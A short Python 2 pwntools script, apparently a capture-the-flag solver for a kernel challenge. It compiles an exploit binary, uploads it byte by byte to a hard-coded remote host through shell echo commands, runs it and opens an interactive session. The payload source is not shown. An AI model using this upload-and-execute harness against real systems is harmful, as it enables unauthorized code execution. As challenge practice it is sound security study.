#!/usr/bin/env python2

from pwn import *
import os

def hexify(byte):
    return '\\x' + hex(ord(byte))[2:].zfill(2)

def send_cmd(r, cmd):
    print r.recvuntil('$ ')
    r.send(cmd + '\n')

os.system('make _exploit')
os.system('strip _exploit')
exe = open('_exploit', 'rb').read()

if args.LOCAL:
    r = process(['make', 'qemu-nox'])
else:
    r = remote('160.94.179.150', 4011)

send_cmd(r, 'echo -n > exploit')

for i, byte in enumerate(exe):
    print i * 100 // len(exe)
    send_cmd(r, 'echo -n ' + hexify(byte) + ' > byte')
    send_cmd(r, 'cat exploit byte > exploit')

send_cmd(r, 'exploit')
r.interactive()
